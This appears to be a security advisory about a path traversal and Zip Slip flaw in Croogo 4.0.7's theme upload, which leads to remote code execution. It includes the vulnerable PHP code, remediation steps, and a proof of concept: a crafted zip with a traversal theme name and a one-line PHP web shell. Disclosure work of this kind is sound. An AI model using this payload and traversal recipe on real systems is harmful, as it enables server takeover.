# Croogo Extensions Theme Upload Allows theme.json 'name' Directory Traversal + Zip Path Traversal Leading to Arbitrary File Write

## Summary

Croogo 4.0.7 extension theme installer (Extensions plugin) does not validate the 'name' field of the theme.json embedded in uploaded theme archives, nor the entry paths of the archive. ExtensionsInstaller::getThemeName() reads the name field verbatim, and extractTheme() concatenates it into the extraction target directory $themePath = $themeHome . $theme . DS before creating the directory and calling ZipArchive::extractTo(). An attacker can craft a theme package whose name is '../../../../webroot/shell', making the extraction directory escape to the web root and planting a PHP web shell (remote code execution); extractTo() also does not validate entry paths, enabling Zip Slip via '../' entries. The feature is only reachable by superadmin (ACL grants no ordinary role for Extensions).

## Details

Root cause: In Extensions/src/ExtensionsInstaller.php, getThemeName() reads the 'name' field of the theme.json inside the uploaded zip with no filtering whatsoever (lines 193-194: $theme = $json->name), and extractTheme() concatenates it unmodified into the extraction target directory:

$themePath = $themeHome . $theme . DS;  // line 231

followed by new Folder($themePath, true) (line 238) and $Zip->extractTo($themePath) (line 239). ZipArchive::extractTo() does not validate archive entry paths, so entries containing '../' can escape the extraction directory (Zip Slip).

Trust boundary failure: both the theme name (which determines the extraction target directory) and the archive entry paths (which determine the write locations) come from attacker-controlled zip content, and the installer performs no path normalization, basename(), or whitelist validation - the trust boundary is simply missing.

Source-to-sink chain (controller: Croogo\Extensions\Controller\Admin\ThemesController):

1. Entry: POST /admin/extensions/themes/add (ThemesController.php:104-116) reads the uploaded multipart Theme[file] (malicious zip) and directly calls $Installer->extractTheme($file['tmp_name']).
2. Name extraction: extractTheme() (ExtensionsInstaller.php:225-227) calls getThemeName() (:175-209), which locateName('theme.json') reads the 'name' field of the archive-controlled theme.json (:193-194), unfiltered.
3. Directory concatenation: $themePath = $themeHome . $theme . DS (:231) where $themeHome is App::path('Plugin'); name='../../../../webroot/shell' resolves $themePath to shell/ under the web root.
4. Sink (:238-239): new Folder($themePath, true) creates the directory and $Zip->extractTo($themePath) extracts shell.php from the archive into webroot/shell/.
5. Result: GET /shell/shell.php?c=<cmd> triggers PHP execution, achieving RCE.

Privilege context: the default ACL seed (Install/src/InstallManager.php setupGrants) grants no ordinary role for Extensions, so only superadmin can reach it (superadmin bypasses ACL at Acl/src/Auth/AclCachedAuthorize.php:118-120).

Core vulnerable code path:

```php
// Extensions/src/ExtensionsInstaller.php:219-254
public function extractTheme($path = null, $theme = null)
{
    if (!file_exists($path)) {
        throw new Exception(__d('croogo', 'Invalid theme file path'));
    }

    if (empty($theme)) {
        $theme = $this->getThemeName($path);
    }

    $themeHome = App::path('Plugin');
    $themeHome = reset($themeHome);
    $themePath = $themeHome . $theme . DS;
    if (is_dir($themePath)) {
        throw new Exception(__d('croogo', 'Theme already exists'));
    }

    $Zip = new ZipArchive;
    if ($Zip->open($path) === true) {
        new Folder($themePath, true);
        $Zip->extractTo($themePath);
```

The attacker-controlled theme name (from theme.json) is concatenated unmodified into the extraction target path, and ZipArchive::extractTo() does not validate entry paths. A name of '../../../../webroot/shell' makes the archive extract under the web root, planting an executable PHP web shell.

```php
// Extensions/src/ExtensionsInstaller.php:175-209
public function getThemeName($path = null)
{
    if (empty($path)) {
        throw new Exception(__d('croogo', 'Invalid theme path'));
    }

    if (isset($this->_themeName[$path])) {
        return $this->_themeName[$path];
    }

    $Zip = new ZipArchive;
    if ($Zip->open($path) === true) {
        $search = 'webroot/theme.json';
        $index = $Zip->locateName('theme.json', ZIPARCHIVE::FL_NODIR);
        if ($index !== false) {
            $file = $Zip->getNameIndex($index);
            $this->_rootPath[$path] = str_replace($search, '', $file);
            $json = json_decode($Zip->getFromIndex($index));
            if (!empty($json->name)) {
                $theme = $json->name;
            }
        }
        $Zip->close();
        if (!$theme) {
            throw new Exception(__d('croogo', 'Invalid theme'));
        }
        $this->_themeName[$path] = $theme;

        return $theme;
    } else {
        throw new Exception(__d('croogo', 'Invalid zip archive'));
    }

    return false;
}
```

The theme name is taken verbatim from the 'name' field of the archive-controlled theme.json with no basename()/whitelist filtering, so it may contain directory traversal sequences such as '../../../../webroot/shell'.

```php
// Extensions/src/Controller/Admin/ThemesController.php:100-120
public function add()
{
    $this->set('title_for_layout', __d('croogo', 'Upload a new theme'));

    if ($this->getRequest()->is('post')) {
        $data = $this->getRequest()->getData();
        $file = $data['Theme']['file'];
        unset($data['Theme']['file']);
        $this->request = $this->getRequest()->withParsedBody($data);

        $Installer = new ExtensionsInstaller;
        try {
            $Installer->extractTheme($file['tmp_name']);
            $this->Flash->success(__d('croogo', 'Theme uploaded successfully.'));
        } catch (Exception $e) {
            $this->Flash->error($e->getMessage());
        }

        return $this->redirect(['action' => 'index']);
    }
}
```

The upload entry point forwards the uploaded zip directly to extractTheme() with no archive/name validation, reaching the vulnerable extraction path.

## POC

Preconditions:

- Superadmin backend session obtained. Access to the upload page at `/admin/extensions/themes/add` is required (CSRF token needed). PHP zip extension is available (default).

Step 1: Construct a malicious ZIP file

- `webroot/theme.json` = `{"name":"../webroot/s1"}`; the ZIP root contains `shell.php` (content: `<?php system($_GET['c']); ?>`)

<img width="553" height="115" alt="image" src="https://github.com/user-attachments/assets/401a0593-0b94-4f05-b476-e45659a3b919" />

Step 2: Log in

- `POST /admin/users/users/login` to obtain the CAKEPHP session

Step 3: Upload

- `POST /admin/extensions/themes/add` with multipart field `Theme[file]=evil.zip` (including `_csrfToken`/`_Token[fields]`); response is `302` → `/admin/extensions/themes`

<img width="2200" height="787" alt="image" src="https://github.com/user-attachments/assets/4801f3bc-571c-491e-842b-b0ad1e84f509" />

Step 4: Verify RCE

<img width="676" height="219" alt="image" src="https://github.com/user-attachments/assets/f9326c50-e49e-4215-8197-5b8282fa2c45" />

Note: In the test environment, using four levels of `../` in the details was excessive (paths: `plugins=/var/www/croogo/plugins`, `webroot=/var/www/croogo/webroot`; only one level was needed); attempts using 2–4 levels failed because the directory was created outside the `webroot` or already existed (resulting in the flash message "Theme already exists" or silent failure).

## Impact

The theme upload feature can write a PHP web shell under the web root via directory traversal, achieving remote code execution; ZipArchive::extractTo() without entry path validation enables Zip Slip, writing files to arbitrary directories. An attacker can read/modify application files and data, plant backdoors, and fully compromise the instance as the web server user.

## Remediation

1. Strictly validate the theme.json 'name' field: allow only [A-Za-z0-9_-] and apply basename(); reject any path separators and '..'.
2. Before extractTo(), iterate archive entries and reject entries containing '../', absolute paths, or drive-letter prefixes (Zip Slip protection).
3. Fix the extraction target inside the Plugin directory and verify with realpath that the final path stays strictly within the target directory.
4. Add limits on archive size/entry count and validate required theme.json fields.

## Supplemental Information

### Affected products

- Vendor / project: croogo

- Repository: https://github.com/croogo/croogo
- Issue：https://github.com/croogo/croogo/issues/1010
- Package name: croogo/croogo
- Affected versions: 4.0.7
- Fixed version: unknown / not confirmed.

### Vulnerability type

- Arbitrary file write / path traversal
- CWE: CWE-22 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
- Suggested severity: High

### Reporter

Guangzhou University: Wen Youwen, Wang Le
